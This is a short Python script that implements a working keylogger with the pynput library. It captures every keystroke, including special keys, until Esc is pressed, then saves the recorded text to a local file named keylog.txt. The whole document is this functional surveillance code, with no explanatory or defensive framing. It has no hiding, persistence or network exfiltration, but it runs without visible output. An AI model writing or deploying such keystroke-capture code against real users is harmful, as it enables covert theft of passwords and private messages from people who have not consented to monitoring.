from pynput import keyboard

# This will store the logged keystrokes
log = ""

# This function is called whenever a key is pressed
def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        else:
            log += " " + str(key) + " "

# This function is called whenever a key is released
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start listening to the keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Save the logged keystrokes to a file
with open("keylog.txt", "w") as file:
    file.write(log)